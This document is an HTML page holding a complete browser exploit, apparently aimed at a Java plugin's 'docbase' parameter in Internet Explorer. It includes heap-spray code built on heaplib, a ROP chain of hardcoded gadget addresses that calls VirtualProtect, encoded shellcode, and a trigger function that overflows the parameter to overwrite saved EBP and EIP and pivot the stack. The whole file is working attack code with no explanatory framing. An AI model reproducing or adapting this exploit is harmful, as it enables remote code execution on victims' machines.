<html>
<head>
   <link rel="shortcut icon" href="http://127.0.0.1:9999/x.ico" />
   <script src="heaplib.js"></script>

   <script>

   //// HELPER FUNCTIONS

   function packv(n) {
      var s = new Number(n).toString(16);
      while(s.length < 8) s = "0" + s;
      return(unescape("%u" + s.substring(4,8) + "%u" + s.substring(0,4)));
   }

   function le(hex) {
      var s = new Number(hex).toString(16);
      while(s.length < 8) s = "0" + s;

      var r = "%" + s.substring(6)
            + "%" + s.substring(4,6) 
            + "%" + s.substring(2,4) 
            + "%" + s.substring(0,2);
            
      return unescape(r);
   }

   //// USEFUL OFFSETS

   var offsetECX = 376;
   var offsetEBP = 388;
   var offsetEIP = 392;
   var offsetESP = 412;

   //// GADGETS

   // leave; ret;
   var leave_ret = 0x7c3411a4;

   // ret;
   var ret = 0x7c3713fc;

   // pop eax; ret;
   var pop_eax_ret = 0x7c3590be;

   // mov eax, [eax]; ret;
   var swap_eax_ret = 0x7c3530ea;

   // call eax; ret;
   var call_eax_ret = 0x7c341fe4;

   // jmp eax;
   var jmp_eax = 0x7c359b23;


   //// OTHER ARGUMENTS / PARAMETERS

   // base address of the payload on the heap
   var payload_base_address = 0x0a0a2020;

   // shellcode
   var shellcode = unescape("%ue089%uc1d9%u70d9%u5df4%u5955%u4949%u4949%u4949%u4949%u4949%u4343%u4343%u4343%u5137%u6a5a%u5841%u3050%u3041%u6b41%u4141%u3251%u4241%u4232%u3042%u4242%u4241%u5058%u4138%u7542%u494a%u4c6b%u7869%u426c%u5035%u5035%u7067%u5053%u694e%u6558%u7174%u304f%u4462%u4b6c%u5030%u5056%u4b6c%u4261%u4c34%u4b4c%u7262%u5454%u4b6c%u5272%u5847%u6f56%u3738%u6a32%u4656%u6175%u4f4b%u4c6e%u6c35%u7131%u6c61%u3243%u4c66%u7055%u616a%u4f78%u4d54%u6166%u4758%u524b%u324c%u7232%u7752%u4b6c%u6273%u3032%u4b4c%u7a73%u4c77%u4b4c%u6c52%u7146%u4833%u7349%u7853%u5165%u715a%u7142%u4b4c%u6933%u7065%u3173%u734a%u4b6c%u6942%u3832%u6378%u6a65%u5951%u6b4e%u3470%u6b6e%u7147%u664b%u3130%u6f39%u6c6c%u316f%u6f4a%u4d74%u5135%u4778%u4867%u7069%u3534%u464b%u7357%u4d73%u6839%u4b57%u4d43%u7435%u4533%u6478%u3876%u6b4e%u3866%u3471%u6136%u634b%u5653%u4b6c%u6c76%u6b62%u6b6e%u4871%u6c67%u6136%u737a%u4b4c%u5455%u4b4c%u7177%u306e%u794f%u7473%u6434%u6474%u4b61%u6b53%u3165%u6933%u6a63%u6173%u6f39%u7069%u6f33%u4f51%u5a70%u6b4e%u5244%u6b78%u4d6c%u6d43%u3845%u6355%u6235%u5065%u7077%u4872%u4733%u3344%u3250%u6f63%u5430%u6870%u4c50%u6731%u6664%u7737%u6f59%u654b%u3868%u305a%u3173%u5065%u3073%u3961%u346f%u4431%u3046%u5833%u6974%u706f%u4b52%u3073%u4f6b%u4559%u3046%u7072%u3076%u3056%u3077%u7042%u7053%u5070%u5863%u7a69%u4f34%u4f39%u504b%u6f59%u656b%u377a%u6a30%u5575%u4842%u4f73%u3063%u5075%u7177%u6830%u3233%u5035%u6157%u6c33%u796f%u467a%u5a53%u3072%u7632%u7772%u4852%u395a%u3569%u4443%u3165%u4f4b%u354e%u354b%u706b%u5452%u6c46%u6f59%u6e72%u7837%u7570%u4c5a%u5843%u7038%u656d%u626c%u7642%u6f49%u4569%u6850%u6370%u4d52%u6450%u7067%u594d%u7359%u3736%u6763%u6753%u6175%u6649%u5a43%u3242%u3946%u3666%u6268%u6d79%u5663%u4738%u3437%u7435%u6c75%u7137%u5145%u4d6c%u6472%u4456%u5034%u667a%u3053%u4470%u5470%u5070%u3646%u7662%u7642%u7653%u6653%u6e32%u7642%u7652%u3366%u6663%u5843%u7930%u4c58%u4f57%u364b%u6f79%u654b%u396b%u506b%u4e30%u6663%u3637%u6f49%u5066%u5863%u6856%u374b%u6d57%u7031%u4f6b%u356e%u4b4f%u505a%u754c%u3269%u5670%u7871%u664c%u656f%u6d4d%u4d4d%u6f69%u4569%u4c37%u7657%u4c43%u6a56%u704f%u6b49%u506b%u3564%u4554%u4b6f%u7743%u7366%u5242%u4f72%u4a72%u5045%u3356%u6f79%u754a%u4141");

   // pad end of shellcode to align at word boundary
   while((shellcode.length * 2) % 4 != 0)
      shellcode += unescape("%90");

   // pointer to VirtualProtect stub
   var vprotect_func_ptr = 0x7c37a140;

   // VirtualProtect() arguments
   var lpAddress = 0x0a0a2020;
   var dwSize = 0x00004000;
   var flNewProtect = 0x00000040; // RWX
   var lpflOldProtect = 0x0a0a0a0a; // any writeable

   // heap address to point to top of ROP chain on heap
   // rop chain is second part of the payload
   var ropchain_offset = (shellcode.length * 2) - 4;
   var ropchain_address = payload_base_address + ropchain_offset;

   // heap address to jump to -> lands in nopsled on heap
   // points to the somewhere in the nopsled located after the ROP chain
   var nopsled_jmp_address = ropchain_address + 512;

   var ropchain_words = [
      pop_eax_ret,
      vprotect_func_ptr,
      swap_eax_ret,
      call_eax_ret,
      lpAddress,
      dwSize,
      flNewProtect,
      lpflOldProtect,
      pop_eax_ret,
      nopsled_jmp_address,
      jmp_eax
   ];

   // construct the rop chain
   var ropchain = "";
   for(i = 0; i < ropchain_words.length; i++)
      ropchain += packv(ropchain_words[i]);


   function spray_heap() {
      heap = new heapLib.ie(0x20000);

      var payload, block1, nopsled1; //if it is 314bytes + 2 = 316 bytes 4 bytes alignments. calc.exe 200 bytes
      
      // payload is the ropchain appended to the end of the shellcode
      payload = shellcode + ropchain;
      
      block1 = unescape("%u9090%u9090");

      // build nopsled1
      nopsled1 = payload;
      while(nopsled1.length < 0x1000)
         nopsled1 += block1;

      var heapblock1 = nopsled1;

      while(heapblock1.length < 0x40000)
         heapblock1 += heapblock1;

      var trimmedblock1 = heapblock1.substring(2, 0x40000 - 0x21);

      // heap spray
      for(var i = 0 ; i < 800 ; i++)
         heap.alloc(trimmedblock1);
   }

   function trigger() {

      var buf = "";

      // fill buffer with A's until saved EBP location
      for(i = 0; i < offsetEBP; i++)
         buf += unescape("%41");
      
      // overwrite saved EBP for stack pivot
      buf += le(ropchain_address);

      // overwrite saved EIP -> cause stack pivot
      buf += le(leave_ret);

      var htmlTags =
         "<object type='application/x-java-applet'>" +
         "<param name='launchjnlp' value='1'>" +
         "<param name='docbase' value='" + buf + "'>" +
         "</object>";

      document.write(htmlTags);
   }
   </script>
</head>
<body onload="spray_heap()">
   <input type="button" value="Click Me" onclick="trigger()">
</body>
</html>

